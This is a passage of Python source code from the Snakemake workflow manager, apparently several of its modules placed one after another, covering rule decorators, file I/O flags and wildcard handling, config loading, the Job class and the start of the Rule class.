            return ruleinfo.func

        return decorate

    def docstring(self, string):
        def decorate(ruleinfo):
            ruleinfo.docstring = string
            return ruleinfo

        return decorate

    def input(self, *paths, **kwpaths):
        def decorate(ruleinfo):
            ruleinfo.input = (paths, kwpaths)
            return ruleinfo

        return decorate

    def output(self, *paths, **kwpaths):
        def decorate(ruleinfo):
            ruleinfo.output = (paths, kwpaths)
            return ruleinfo

        return decorate

    def params(self, *params, **kwparams):
        def decorate(ruleinfo):
            ruleinfo.params = (params, kwparams)
            return ruleinfo

        return decorate

    def message(self, message):
        def decorate(ruleinfo):
            ruleinfo.message = message
            return ruleinfo

        return decorate

    def benchmark(self, benchmark):
        def decorate(ruleinfo):
            ruleinfo.benchmark = benchmark
            return ruleinfo

        return decorate

    def threads(self, threads):
        def decorate(ruleinfo):
            ruleinfo.threads = threads
            return ruleinfo

        return decorate

    def resources(self, *args, **resources):
        def decorate(ruleinfo):
            ruleinfo.resources = (args, resources)
            return ruleinfo

        return decorate

    def priority(self, priority):
        def decorate(ruleinfo):
            ruleinfo.priority = priority
            return ruleinfo

        return decorate

    def version(self, version):
        def decorate(ruleinfo):
            ruleinfo.version = version
            return ruleinfo

        return decorate

    def log(self, *logs, **kwlogs):
        def decorate(ruleinfo):
            ruleinfo.log = (logs, kwlogs)
            return ruleinfo

        return decorate

    def shellcmd(self, cmd):
        def decorate(ruleinfo):
            ruleinfo.shellcmd = cmd
            return ruleinfo

        return decorate

    def norun(self):
        def decorate(ruleinfo):
            ruleinfo.norun = True
            return ruleinfo

        return decorate

    def run(self, func):
        return RuleInfo(func)

    @staticmethod
    def _empty_decorator(f):
        return f


class RuleInfo:
    def __init__(self, func):
        self.func = func
        self.shellcmd = None
        self.norun = False
        self.input = None
        self.output = None
        self.params = None
        self.message = None
        self.benchmark = None
        self.threads = None
        self.resources = None
        self.priority = None
        self.version = None
        self.log = None
        self.docstring = None


class Subworkflow:
    def __init__(self, workflow, name, snakefile, workdir):
        self.workflow = workflow
        self.name = name
        self._snakefile = snakefile
        self._workdir = workdir

    @property
    def snakefile(self):
        if self._snakefile is None:
            return os.path.abspath(os.path.join(self.workdir, "Snakefile"))
        if not os.path.isabs(self._snakefile):
            return os.path.abspath(os.path.join(self.workflow.basedir,
                                                self._snakefile))
        return self._snakefile

    @property
    def workdir(self):
        workdir = "." if self._workdir is None else self._workdir
        if not os.path.isabs(workdir):
            return os.path.abspath(os.path.join(self.workflow.basedir,
                                                workdir))
        return workdir

    def target(self, paths):
        if not_iterable(paths):
            return flag(os.path.join(self.workdir, paths), "subworkflow", self)
        return [self.target(path) for path in paths]

    def targets(self, dag):
        return [f for job in dag.jobs for f in job.subworkflow_input
                if job.subworkflow_input[f] is self]


class Rules:
    """ A namespace for rules so that they can be accessed via dot notation. """
    pass


def srcdir(path):
    """Return the absolute path, relative to the source directory of the current Snakefile."""
    if not workflow.included_stack:
        return None
    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import re
import stat
import time
import json
from itertools import product, chain
from collections import Iterable, namedtuple
from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError                    
from snakemake.logging import logger


def lstat(f):
    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)


def lutime(f, times):
    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)


def lchmod(f, mode):
    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)


def IOFile(file, rule=None):
    f = _IOFile(file)
    f.rule = rule
    return f


class _IOFile(str):
    """
    A file that is either input or output of a rule.
    """

    dynamic_fill = "__snakemake_dynamic__"

    def __new__(cls, file):
        obj = str.__new__(cls, file)
        obj._is_function = type(file).__name__ == "function"
        obj._file = file
        obj.rule = None
        obj._regex = None
        return obj

    @property
    def file(self):
        if not self._is_function:
            return self._file
        else:
            raise ValueError("This IOFile is specified as a function and "
                             "may not be used directly.")

    @property
    def exists(self):
        return os.path.exists(self.file)

    @property
    def protected(self):                    
        return self.exists and not os.access(self.file, os.W_OK)                    

    @property
    def mtime(self):
        # do not follow symlinks for modification time
        return lstat(self.file).st_mtime

    @property
    def size(self):
        # follow symlinks but throw error if invalid
        self.check_broken_symlink()
        return os.path.getsize(self.file)

    def check_broken_symlink(self):
        """ Raise WorkflowError if file is a broken symlink. """
        if not self.exists and lstat(self.file):                    
            raise WorkflowError("File {} seems to be a broken symlink.".format(self.file))

    def is_newer(self, time):
        return self.mtime > time

    def prepare(self):
        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]
        dir = os.path.dirname(path_until_wildcard)
        if len(dir) > 0 and not os.path.exists(dir):
            try:
                os.makedirs(dir)
            except OSError as e:
                # ignore Errno 17 "File exists" (reason: multiprocessing)
                if e.errno != 17:
                    raise e

    def protect(self):
        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~
                stat.S_IWOTH)
        if os.path.isdir(self.file):
            for root, dirs, files in os.walk(self.file):
                for d in dirs:
                    lchmod(os.path.join(self.file, d), mode)
                for f in files:
                    lchmod(os.path.join(self.file, f), mode)
        else:
            lchmod(self.file, mode)

    def remove(self):
        remove(self.file)

    def touch(self):                    
        try:
            lutime(self.file, None)                    
        except OSError as e:
            if e.errno == 2:
                raise MissingOutputException(
                    "Output file {} of rule {} shall be touched but "
                    "does not exist.".format(self.file, self.rule.name),
                    lineno=self.rule.lineno,
                    snakefile=self.rule.snakefile)
            else:
                raise e

    def touch_or_create(self):
        try:
            self.touch()
        except MissingOutputException:
            # create empty file
            with open(self.file, "w") as f:
                pass

    def apply_wildcards(self, wildcards,
                        fill_missing=False,
                        fail_dynamic=False):
        f = self._file
        if self._is_function:
            f = self._file(Namedlist(fromdict=wildcards))

        return IOFile(apply_wildcards(f, wildcards,                    
                                      fill_missing=fill_missing,
                                      fail_dynamic=fail_dynamic,
                                      dynamic_fill=self.dynamic_fill),
                      rule=self.rule)                    

    def get_wildcard_names(self):
        return get_wildcard_names(self.file)

    def contains_wildcard(self):
        return contains_wildcard(self.file)

    def regex(self):
        if self._regex is None:
            # compile a regular expression
            self._regex = re.compile(regex(self.file))
        return self._regex

    def constant_prefix(self):
        first_wildcard = _wildcard_regex.search(self.file)
        if first_wildcard:
            return self.file[:first_wildcard.start()]
        return self.file

    def match(self, target):
        return self.regex().match(target) or None

    def format_dynamic(self):
        return self.replace(self.dynamic_fill, "{*}")

    def __eq__(self, other):
        f = other._file if isinstance(other, _IOFile) else other
        return self._file == f

    def __hash__(self):
        return self._file.__hash__()


_wildcard_regex = re.compile(
    "\{\s*(?P<name>\w+?)(\s*,\s*(?P<constraint>([^\{\}]+|\{\d+(,\d+)?\})*))?\s*\}")

#    "\{\s*(?P<name>\w+?)(\s*,\s*(?P<constraint>[^\}]*))?\s*\}")


def wait_for_files(files, latency_wait=3):
    """Wait for given files to be present in filesystem."""
    files = list(files)
    get_missing = lambda: [f for f in files if not os.path.exists(f)]
    missing = get_missing()
    if missing:
        logger.info("Waiting at most {} seconds for missing files.".format(
            latency_wait))
        for _ in range(latency_wait):
            if not get_missing():
                return
            time.sleep(1)
        raise IOError("Missing files after {} seconds:\n{}".format(
            latency_wait, "\n".join(get_missing())))


def get_wildcard_names(pattern):
    return set(match.group('name')
               for match in _wildcard_regex.finditer(pattern))


def contains_wildcard(path):
    return _wildcard_regex.search(path) is not None


def remove(file):
    if os.path.exists(file):
        if os.path.isdir(file):
            try:
                os.removedirs(file)
            except OSError:
                # ignore non empty directories
                pass
        else:
            os.remove(file)


def regex(filepattern):
    f = []
    last = 0
    wildcards = set()
    for match in _wildcard_regex.finditer(filepattern):
        f.append(re.escape(filepattern[last:match.start()]))
        wildcard = match.group("name")
        if wildcard in wildcards:
            if match.group("constraint"):
                raise ValueError(
                    "If multiple wildcards of the same name "
                    "appear in a string, eventual constraints have to be defined "
                    "at the first occurence and will be inherited by the others.")
            f.append("(?P={})".format(wildcard))
        else:
            wildcards.add(wildcard)
            f.append("(?P<{}>{})".format(wildcard, match.group("constraint") if
                                         match.group("constraint") else ".+"))
        last = match.end()
    f.append(re.escape(filepattern[last:]))
    f.append("$")  # ensure that the match spans the whole file
    return "".join(f)


def apply_wildcards(pattern, wildcards,
                    fill_missing=False,
                    fail_dynamic=False,
                    dynamic_fill=None,
                    keep_dynamic=False):
    def format_match(match):
        name = match.group("name")
        try:
            value = wildcards[name]
            if fail_dynamic and value == dynamic_fill:
                raise WildcardError(name)
            return str(value)  # convert anything into a str
        except KeyError as ex:
            if keep_dynamic:
                return "{{{}}}".format(name)
            elif fill_missing:
                return dynamic_fill
            else:
                raise WildcardError(str(ex))

    return re.sub(_wildcard_regex, format_match, pattern)


def not_iterable(value):
    return isinstance(value, str) or not isinstance(value, Iterable)


class AnnotatedString(str):
    def __init__(self, value):
        self.flags = dict()


def flag(value, flag_type, flag_value=True):
    if isinstance(value, AnnotatedString):
        value.flags[flag_type] = flag_value
        return value
    if not_iterable(value):
        value = AnnotatedString(value)
        value.flags[flag_type] = flag_value
        return value
    return [flag(v, flag_type, flag_value=flag_value) for v in value]


def is_flagged(value, flag):
    if isinstance(value, AnnotatedString):
        return flag in value.flags                    
    return False


def temp(value):
    """
    A flag for an input or output file that shall be removed after usage.
    """
    if is_flagged(value, "protected"):
        raise SyntaxError(
            "Protected and temporary flags are mutually exclusive.")
    return flag(value, "temp")


def temporary(value):
    """ An alias for temp. """
    return temp(value)


def protected(value):
    """ A flag for a file that shall be write protected after creation. """
    if is_flagged(value, "temp"):
        raise SyntaxError(
            "Protected and temporary flags are mutually exclusive.")
    return flag(value, "protected")


def dynamic(value):
    """
    A flag for a file that shall be dynamic, i.e. the multiplicity
    (and wildcard values) will be expanded after a certain
    rule has been run """
    annotated = flag(value, "dynamic")                    
    tocheck = [annotated] if not_iterable(annotated) else annotated
    for file in tocheck:
        matches = list(_wildcard_regex.finditer(file))
        #if len(matches) != 1:
        #    raise SyntaxError("Dynamic files need exactly one wildcard.")
        for match in matches:
            if match.group("constraint"):
                raise SyntaxError(
                    "The wildcards in dynamic files cannot be constrained.")
    return annotated


def touch(value):
    return flag(value, "touch")


def expand(*args, **wildcards):
    """
    Expand wildcards in given filepatterns.

    Arguments
    *args -- first arg: filepatterns as list or one single filepattern,
        second arg (optional): a function to combine wildcard values
        (itertools.product per default)
    **wildcards -- the wildcards as keyword arguments
        with their values as lists
    """
    filepatterns = args[0]
    if len(args) == 1:
        combinator = product
    elif len(args) == 2:
        combinator = args[1]
    if isinstance(filepatterns, str):
        filepatterns = [filepatterns]

    def flatten(wildcards):
        for wildcard, values in wildcards.items():
            if isinstance(values, str) or not isinstance(values, Iterable):
                values = [values]
            yield [(wildcard, value) for value in values]

    try:
        return [filepattern.format(**comb)
                for comb in map(dict, combinator(*flatten(wildcards))) for
                filepattern in filepatterns]
    except KeyError as e:
        raise WildcardError("No values given for wildcard {}.".format(e))


def limit(pattern, **wildcards):
    """
    Limit wildcards to the given values.

    Arguments:
    **wildcards -- the wildcards as keyword arguments
                   with their values as lists
    """
    return pattern.format(**{
        wildcard: "{{{},{}}}".format(wildcard, "|".join(values))
        for wildcard, values in wildcards.items()
    })


def glob_wildcards(pattern):
    """
    Glob the values of the wildcards by matching the given pattern to the filesystem.
    Returns a named tuple with a list of values for each wildcard.
    """
    pattern = os.path.normpath(pattern)
    first_wildcard = re.search("{[^{]", pattern)
    dirname = os.path.dirname(pattern[:first_wildcard.start(
    )]) if first_wildcard else os.path.dirname(pattern)
    if not dirname:
        dirname = "."

    names = [match.group('name')
             for match in _wildcard_regex.finditer(pattern)]
    Wildcards = namedtuple("Wildcards", names)
    wildcards = Wildcards(*[list() for name in names])

    pattern = re.compile(regex(pattern))
    for dirpath, dirnames, filenames in os.walk(dirname):
        for f in chain(filenames, dirnames):
            if dirpath != ".":
                f = os.path.join(dirpath, f)
            match = re.match(pattern, f)
            if match:
                for name, value in match.groupdict().items():
                    getattr(wildcards, name).append(value)
    return wildcards


# TODO rewrite Namedlist!
class Namedlist(list):
    """
    A list that additionally provides functions to name items. Further,
    it is hashable, however the hash does not consider the item names.
    """

    def __init__(self, toclone=None, fromdict=None, plainstr=False):
        """
        Create the object.

        Arguments
        toclone  -- another Namedlist that shall be cloned
        fromdict -- a dict that shall be converted to a
            Namedlist (keys become names)
        """
        list.__init__(self)
        self._names = dict()

        if toclone:
            self.extend(map(str, toclone) if plainstr else toclone)
            if isinstance(toclone, Namedlist):
                self.take_names(toclone.get_names())
        if fromdict:
            for key, item in fromdict.items():
                self.append(item)
                self.add_name(key)

    def add_name(self, name):
        """
        Add a name to the last item.

        Arguments
        name -- a name
        """
        self.set_name(name, len(self) - 1)

    def set_name(self, name, index, end=None):
        """
        Set the name of an item.

        Arguments
        name  -- a name
        index -- the item index
        """
        self._names[name] = (index, end)
        if end is None:
            setattr(self, name, self[index])
        else:
            setattr(self, name, Namedlist(toclone=self[index:end]))

    def get_names(self):
        """
        Get the defined names as (name, index) pairs.
        """
        for name, index in self._names.items():
            yield name, index

    def take_names(self, names):
        """
        Take over the given names.

        Arguments
        names -- the given names as (name, index) pairs
        """
        for name, (i, j) in names:
            self.set_name(name, i, end=j)

    def items(self):
        for name in self._names:
            yield name, getattr(self, name)

    def allitems(self):
        next = 0
        for name, index in sorted(self._names.items(),
                                  key=lambda item: item[1][0]):
            start, end = index
            if end is None:
                end = start + 1
            if start > next:
                for item in self[next:start]:
                    yield None, item
            yield name, getattr(self, name)
            next = end
        for item in self[next:]:
            yield None, item

    def insert_items(self, index, items):
        self[index:index + 1] = items
        add = len(items) - 1
        for name, (i, j) in self._names.items():
            if i > index:
                self._names[name] = (i + add, j + add)
            elif i == index:
                self.set_name(name, i, end=i + len(items))

    def keys(self):
        return self._names

    def plainstrings(self):
        return self.__class__.__call__(toclone=self, plainstr=True)

    def __getitem__(self, key):
        try:
            return super().__getitem__(key)
        except TypeError:
            pass
        return getattr(self, key)

    def __hash__(self):
        return hash(tuple(self))

    def __str__(self):
        return " ".join(map(str, self))


class InputFiles(Namedlist):
    pass


class OutputFiles(Namedlist):
    pass


class Wildcards(Namedlist):
    pass


class Params(Namedlist):
    pass


class Resources(Namedlist):
    pass


class Log(Namedlist):
    pass


def _load_configfile(configpath):
    "Tries to load a configfile first as JSON, then as YAML, into a dict."
    try:
        with open(configpath) as f:
            try:
                return json.load(f)
            except ValueError:
                f.seek(0)  # try again
            try:
                import yaml
            except ImportError:
                raise WorkflowError("Config file is not valid JSON and PyYAML "
                                    "has not been installed. Please install "
                                    "PyYAML to use YAML config files.")
            try:
                return yaml.load(f)
            except yaml.YAMLError:
                raise WorkflowError("Config file is not valid JSON or YAML.")
    except FileNotFoundError:
        raise WorkflowError("Config file {} not found.".format(configpath))


def load_configfile(configpath):
    "Loads a JSON or YAML configfile as a dict, then checks that it's a dict."
    config = _load_configfile(configpath)
    if not isinstance(config, dict):
        raise WorkflowError("Config file must be given as JSON or YAML "
                            "with keys at top level.")
    return config

##### Wildcard pumping detection #####


class PeriodicityDetector:
    def __init__(self, min_repeat=50, max_repeat=100):
        """
        Args:
            max_len (int): The maximum length of the periodic substring.
        """
        self.regex = re.compile(
            "((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$".format(
                min_repeat=min_repeat - 1,
                max_repeat=max_repeat - 1))

    def is_periodic(self, value):
        """Returns the periodic substring or None if not periodic."""
        m = self.regex.search(value)  # search for a periodic suffix.
        if m is not None:
            return m.group("value")

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import sys
import base64
import json

from collections import defaultdict
from itertools import chain
from functools import partial
from operator import attrgetter

from snakemake.io import IOFile, Wildcards, Resources, _IOFile                    
from snakemake.utils import format, listfiles
from snakemake.exceptions import RuleException, ProtectedOutputException
from snakemake.exceptions import UnexpectedOutputException
from snakemake.logging import logger


def jobfiles(jobs, type):
    return chain(*map(attrgetter(type), jobs))


class Job:
    HIGHEST_PRIORITY = sys.maxsize

    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):
        self.rule = rule
        self.dag = dag
        self.targetfile = targetfile

        self.wildcards_dict = self.rule.get_wildcards(targetfile)
        self.wildcards = Wildcards(fromdict=self.wildcards_dict)
        self._format_wildcards = (self.wildcards if format_wildcards is None
                                  else Wildcards(fromdict=format_wildcards))

        (self.input, self.output, self.params, self.log, self.benchmark,
         self.ruleio,
         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)

        self.resources_dict = {
            name: min(self.rule.workflow.global_resources.get(name, res), res)
            for name, res in rule.resources.items()
        }
        self.threads = self.resources_dict["_cores"]
        self.resources = Resources(fromdict=self.resources_dict)
        self._inputsize = None

        self.dynamic_output, self.dynamic_input = set(), set()
        self.temp_output, self.protected_output = set(), set()
        self.touch_output = set()
        self.subworkflow_input = dict()
        for f in self.output:
            f_ = self.ruleio[f]
            if f_ in self.rule.dynamic_output:
                self.dynamic_output.add(f)
            if f_ in self.rule.temp_output:
                self.temp_output.add(f)
            if f_ in self.rule.protected_output:
                self.protected_output.add(f)
            if f_ in self.rule.touch_output:
                self.touch_output.add(f)
        for f in self.input:
            f_ = self.ruleio[f]
            if f_ in self.rule.dynamic_input:
                self.dynamic_input.add(f)
            if f_ in self.rule.subworkflow_input:
                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]
        self._hash = self.rule.__hash__()
        if True or not self.dynamic_output:
            for o in self.output:
                self._hash ^= o.__hash__()

    @property
    def priority(self):
        return self.dag.priority(self)

    @property
    def b64id(self):
        return base64.b64encode((self.rule.name + "".join(self.output)
                                 ).encode("utf-8")).decode("utf-8")

    @property
    def inputsize(self):
        """
        Return the size of the input files.
        Input files need to be present.
        """
        if self._inputsize is None:
            self._inputsize = sum(f.size for f in self.input)
        return self._inputsize

    @property
    def message(self):
        """ Return the message for this job. """
        try:
            return (self.format_wildcards(self.rule.message) if
                    self.rule.message else None)
        except AttributeError as ex:
            raise RuleException(str(ex), rule=self.rule)
        except KeyError as ex:
            raise RuleException("Unknown variable in message "
                                "of shell command: {}".format(str(ex)),
                                rule=self.rule)

    @property
    def shellcmd(self):
        """ Return the shell command. """
        try:
            return (self.format_wildcards(self.rule.shellcmd) if
                    self.rule.shellcmd else None)
        except AttributeError as ex:
            raise RuleException(str(ex), rule=self.rule)
        except KeyError as ex:
            raise RuleException("Unknown variable when printing "
                                "shell command: {}".format(str(ex)),
                                rule=self.rule)

    @property
    def expanded_output(self):
        """ Iterate over output files while dynamic output is expanded. """
        for f, f_ in zip(self.output, self.rule.output):
            if f in self.dynamic_output:
                expansion = self.expand_dynamic(
                    f_,
                    restriction=self.wildcards,
                    omit_value=_IOFile.dynamic_fill)
                if not expansion:
                    yield f_
                for f, _ in expansion:
                    yield IOFile(f, self.rule)                    
            else:
                yield f

    @property
    def dynamic_wildcards(self):
        """ Return all wildcard values determined from dynamic output. """
        combinations = set()
        for f, f_ in zip(self.output, self.rule.output):
            if f in self.dynamic_output:
                for f, w in self.expand_dynamic(
                    f_,
                    restriction=self.wildcards,
                    omit_value=_IOFile.dynamic_fill):
                    combinations.add(tuple(w.items()))
        wildcards = defaultdict(list)
        for combination in combinations:
            for name, value in combination:
                wildcards[name].append(value)
        return wildcards

    @property
    def missing_input(self):
        """ Return missing input files. """
        # omit file if it comes from a subworkflow
        return set(f for f in self.input
                   if not f.exists and not f in self.subworkflow_input)

    @property
    def output_mintime(self):
        """ Return oldest output file. """
        existing = [f.mtime for f in self.expanded_output if f.exists]
        if self.benchmark and self.benchmark.exists:
            existing.append(self.benchmark.mtime)
        if existing:
            return min(existing)
        return None

    @property
    def input_maxtime(self):
        """ Return newest input file. """
        existing = [f.mtime for f in self.input if f.exists]
        if existing:
            return max(existing)
        return None

    def missing_output(self, requested=None):
        """ Return missing output files. """
        files = set()
        if self.benchmark and (requested is None or
                               self.benchmark in requested):
            if not self.benchmark.exists:
                files.add(self.benchmark)

        for f, f_ in zip(self.output, self.rule.output):
            if requested is None or f in requested:
                if f in self.dynamic_output:
                    if not self.expand_dynamic(
                        f_,
                        restriction=self.wildcards,
                        omit_value=_IOFile.dynamic_fill):
                        files.add("{} (dynamic)".format(f_))
                elif not f.exists:
                    files.add(f)
        return files

    @property
    def existing_output(self):
        return filter(lambda f: f.exists, self.expanded_output)

    def check_protected_output(self):
        protected = list(filter(lambda f: f.protected, self.expanded_output))
        if protected:
            raise ProtectedOutputException(self.rule, protected)

    def prepare(self):
        """
        Prepare execution of job.
        This includes creation of directories and deletion of previously
        created dynamic files.
        """

        self.check_protected_output()

        unexpected_output = self.dag.reason(self).missing_output.intersection(
            self.existing_output)
        if unexpected_output:
            logger.warning(
                "Warning: the following output files of rule {} were not "
                "present when the DAG was created:\n{}".format(
                    self.rule, unexpected_output))

        if self.dynamic_output:
            for f, _ in chain(*map(partial(self.expand_dynamic,
                                           restriction=self.wildcards,
                                           omit_value=_IOFile.dynamic_fill),
                                   self.rule.dynamic_output)):
                os.remove(f)
        for f, f_ in zip(self.output, self.rule.output):
            f.prepare()
        for f in self.log:
            f.prepare()
        if self.benchmark:
            self.benchmark.prepare()

    def cleanup(self):
        """ Cleanup output files. """
        to_remove = [f for f in self.expanded_output if f.exists]
        if to_remove:
            logger.info("Removing output files of failed job {}"
                        " since they might be corrupted:\n{}".format(
                            self, ", ".join(to_remove)))
            for f in to_remove:
                f.remove()

    def format_wildcards(self, string, **variables):
        """ Format a string with variables from the job. """
        _variables = dict()
        _variables.update(self.rule.workflow.globals)
        _variables.update(dict(input=self.input,
                               output=self.output,
                               params=self.params,
                               wildcards=self._format_wildcards,
                               threads=self.threads,
                               resources=self.resources,
                               log=self.log,
                               version=self.rule.version,
                               rule=self.rule.name, ))
        _variables.update(variables)
        try:
            return format(string, **_variables)
        except NameError as ex:
            raise RuleException("NameError: " + str(ex), rule=self.rule)
        except IndexError as ex:
            raise RuleException("IndexError: " + str(ex), rule=self.rule)

    def properties(self, omit_resources="_cores _nodes".split()):
        resources = {
            name: res
            for name, res in self.resources.items()
            if name not in omit_resources
        }
        params = {name: value for name, value in self.params.items()}
        properties = {
            "rule": self.rule.name,
            "local": self.dag.workflow.is_local(self.rule),
            "input": self.input,
            "output": self.output,
            "params": params,
            "threads": self.threads,
            "resources": resources
        }
        return properties

    def json(self):
        return json.dumps(self.properties())

    def __repr__(self):
        return self.rule.name

    def __eq__(self, other):
        if other is None:
            return False
        return self.rule == other.rule and (
            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)

    def __lt__(self, other):
        return self.rule.__lt__(other.rule)

    def __gt__(self, other):
        return self.rule.__gt__(other.rule)

    def __hash__(self):
        return self._hash

    @staticmethod
    def expand_dynamic(pattern, restriction=None, omit_value=None):
        """ Expand dynamic files. """
        return list(listfiles(pattern,
                              restriction=restriction,
                              omit_value=omit_value))


class Reason:
    def __init__(self):
        self.updated_input = set()
        self.updated_input_run = set()
        self.missing_output = set()
        self.incomplete_output = set()
        self.forced = False
        self.noio = False
        self.nooutput = False
        self.derived = True

    def __str__(self):
        s = list()
        if self.forced:
            s.append("Forced execution")
        else:
            if self.noio:
                s.append("Rules with neither input nor "
                         "output files are always executed.")
            elif self.nooutput:
                s.append("Rules with a run or shell declaration but no output "
                         "are always executed.")
            else:
                if self.missing_output:
                    s.append("Missing output files: {}".format(
                        ", ".join(self.missing_output)))
                if self.incomplete_output:
                    s.append("Incomplete output files: {}".format(
                        ", ".join(self.incomplete_output)))
                updated_input = self.updated_input - self.updated_input_run
                if updated_input:
                    s.append("Updated input files: {}".format(
                        ", ".join(updated_input)))
                if self.updated_input_run:
                    s.append("Input files updated by another job: {}".format(
                        ", ".join(self.updated_input_run)))
        s = "; ".join(s)
        return s

    def __bool__(self):
        return bool(self.updated_input or self.missing_output or self.forced or
                    self.updated_input_run or self.noio or self.nooutput)

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import re
import sys
import inspect
import sre_constants
from collections import defaultdict

from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist
from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log
from snakemake.io import apply_wildcards, is_flagged, not_iterable
from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException


class Rule:
    def __init__(self, *args, lineno=None, snakefile=None):
        """
        Create a rule

        Arguments
        name -- the name of the rule
        """
        if len(args) == 2:
            name, workflow = args
            self.name = name
            self.workflow = workflow
            self.docstring = None
            self.message = None
            self._input = InputFiles()
            self._output = OutputFiles()
            self._params = Params()
            self.dependencies = dict()
            self.dynamic_output = set()
            self.dynamic_input = set()
            self.temp_output = set()
            self.protected_output = set()
            self.touch_output = set()
            self.subworkflow_input = dict()
            self.resources = dict(_cores=1, _nodes=1)
            self.priority = 0
            self.version = None
            self._log = Log()
            self._benchmark = None
            self.wildcard_names = set()
            self.lineno = lineno
            self.snakefile = snakefile
            self.run_func = None
            self.shellcmd = None
            self.norun = False
        elif len(args) == 1:
            other = args[0]
            self.name = other.name
            self.workflow = other.workflow
            self.docstring = other.docstring
            self.message = other.message
            self._input = InputFiles(other._input)
            self._output = OutputFiles(other._output)
            self._params = Params(other._params)
            self.dependencies = dict(other.dependencies)
            self.dynamic_output = set(other.dynamic_output)
            self.dynamic_input = set(other.dynamic_input)
            self.temp_output = set(other.temp_output)
            self.protected_output = set(other.protected_output)
            self.touch_output = set(other.touch_output)
            self.subworkflow_input = dict(other.subworkflow_input)
            self.resources = other.resources
            self.priority = other.priority
            self.version = other.version
            self._log = other._log
            self._benchmark = other._benchmark
            self.wildcard_names = set(other.wildcard_names)
            self.lineno = other.lineno
            self.snakefile = other.snakefile
            self.run_func = other.run_func
            self.shellcmd = other.shellcmd
            self.norun = other.norun

    def dynamic_branch(self, wildcards, input=True):
        def get_io(rule):
            return (rule.input, rule.dynamic_input) if input else (
                rule.output, rule.dynamic_output
            )

        io, dynamic_io = get_io(self)

        branch = Rule(self)
        io_, dynamic_io_ = get_io(branch)

        expansion = defaultdict(list)
        for i, f in enumerate(io):
            if f in dynamic_io:
                try:
                    for e in reversed(expand(f, zip, **wildcards)):
                        expansion[i].append(IOFile(e, rule=branch))                    
                except KeyError:
                    return None

        # replace the dynamic files with the expanded files
        replacements = [(i, io[i], e)
                        for i, e in reversed(list(expansion.items()))]
        for i, old, exp in replacements:
            dynamic_io_.remove(old)
            io_.insert_items(i, exp)

        if not input:
            for i, old, exp in replacements:
                if old in branch.temp_output:
                    branch.temp_output.discard(old)
                    branch.temp_output.update(exp)
                if old in branch.protected_output:
                    branch.protected_output.discard(old)
                    branch.protected_output.update(exp)
                if old in branch.touch_output:
                    branch.touch_output.discard(old)
                    branch.touch_output.update(exp)

            branch.wildcard_names.clear()
            non_dynamic_wildcards = dict((name, values[0])
                                         for name, values in wildcards.items()
                                         if len(set(values)) == 1)
            # TODO have a look into how to concretize dependencies here
            (branch._input, branch._output, branch._params, branch._log,
             branch._benchmark, _, branch.dependencies
             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)
            return branch, non_dynamic_wildcards
        return branch

    def has_wildcards(self):
        """
        Return True if rule contains wildcards.
        """
        return bool(self.wildcard_names)

    @property
    def benchmark(self):
        return self._benchmark

    @benchmark.setter
    def benchmark(self, benchmark):
        self._benchmark = IOFile(benchmark, rule=self)

    @property
    def input(self):
        return self._input

    def set_input(self, *input, **kwinput):
        """
        Add a list of input files. Recursive lists are flattened.

        Arguments
        input -- the list of input files
        """
        for item in input:
            self._set_inoutput_item(item)
        for name, item in kwinput.items():
            self._set_inoutput_item(item, name=name)

    @property
    def output(self):
        return self._output

    @property
    def products(self):
        products = list(self.output)
        if self.benchmark:
            products.append(self.benchmark)
        return products

    def set_output(self, *output, **kwoutput):
        """
        Add a list of output files. Recursive lists are flattened.

        Arguments
        output -- the list of output files
        """
        for item in output:
            self._set_inoutput_item(item, output=True)
        for name, item in kwoutput.items():
            self._set_inoutput_item(item, output=True, name=name)

        for item in self.output:
            if self.dynamic_output and item not in self.dynamic_output:
                raise SyntaxError(
                    "A rule with dynamic output may not define any "
                    "non-dynamic output files.")
            wildcards = item.get_wildcard_names()
            if self.wildcard_names:
                if self.wildcard_names != wildcards:
                    raise SyntaxError(
                        "Not all output files of rule {} "
                        "contain the same wildcards.".format(self.name))
            else:
                self.wildcard_names = wildcards

    def _set_inoutput_item(self, item, output=False, name=None):
        """
        Set an item to be input or output.

        Arguments
        item     -- the item
        inoutput -- either a Namedlist of input or output items
        name     -- an optional name for the item
        """
        inoutput = self.output if output else self.input
        if isinstance(item, str):
            # add the rule to the dependencies
            if isinstance(item, _IOFile):
                self.dependencies[item] = item.rule
            _item = IOFile(item, rule=self)
            if is_flagged(item, "temp"):
                if not output:
                    raise SyntaxError("Only output files may be temporary")
                self.temp_output.add(_item)
            if is_flagged(item, "protected"):
                if not output:
                    raise SyntaxError("Only output files may be protected")
                self.protected_output.add(_item)
            if is_flagged(item, "touch"):
                if not output:
                    raise SyntaxError(
                        "Only output files may be marked for touching.")
                self.touch_output.add(_item)
            if is_flagged(item, "dynamic"):
                if output:
                    self.dynamic_output.add(_item)
                else:
                    self.dynamic_input.add(_item)
            if is_flagged(item, "subworkflow"):
                if output:
                    raise SyntaxError(
                        "Only input files may refer to a subworkflow")
                else:
                    # record the workflow this item comes from
                    self.subworkflow_input[_item] = item.flags["subworkflow"]
            inoutput.append(_item)
            if name:
                inoutput.add_name(name)
        elif callable(item):
            if output:
                raise SyntaxError(
                    "Only input files can be specified as functions")
